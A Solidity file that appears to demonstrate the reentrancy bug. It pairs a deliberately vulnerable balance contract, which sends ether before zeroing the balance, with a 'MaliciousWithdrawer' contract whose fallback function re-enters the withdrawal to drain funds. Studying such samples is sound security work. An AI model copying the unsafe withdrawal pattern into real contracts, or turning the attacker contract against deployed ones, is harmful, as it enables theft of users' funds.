pragma solidity 0.4.19;

contract Reentrancy {

    mapping (address => uint) public userBalances;

    function withdrawBalance() public {
        uint amountToWithdraw = userBalances[msg.sender];

        // At this point, the caller's code is executed, and can call withdrawBalance again
        require(msg.sender.call.value(amountToWithdraw)());
        userBalances[msg.sender] = 0;
    }

    function deposit() payable public {
        userBalances[msg.sender] = msg.value;
    }

}

contract MaliciousWithdrawer {

    int private count;

    function MaliciousWithdrawer() public {
        count = 0;
    }

    function () payable public {
        count += 1;
        if (count < 10) {
            Reentrancy reentrancy = Reentrancy(msg.sender);
            reentrancy.withdrawBalance();
        }
    }

    // trigger
    function withdraw(address addr) public {
        Reentrancy reentrancy = Reentrancy(addr);
        reentrancy.withdrawBalance();
    }

    // deposit
    function deposit(address addr) payable public {
        Reentrancy reentrancy = Reentrancy(addr);
        reentrancy.deposit.value(msg.value)();
    }
}
